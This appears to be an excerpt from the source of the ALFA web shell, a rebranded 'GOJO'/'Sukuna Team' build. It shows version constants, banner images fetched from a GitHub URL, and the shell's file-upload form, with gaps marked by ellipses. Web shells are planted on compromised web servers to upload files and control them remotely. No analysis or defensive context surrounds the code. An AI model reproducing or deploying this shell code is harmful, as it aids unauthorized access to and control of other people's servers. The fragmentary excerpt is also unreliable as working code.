...
define("__ALFA_VERSION__", "404");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "GOJO");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/kinglodon/kinglodon/main/gojo-png.png" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/kinglodon/kinglodon/main/gojo-png.png" /></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Sukuna Team &copy; ".date('Y')." ]</span><br></div></td>
</tr>
</table>
</div>
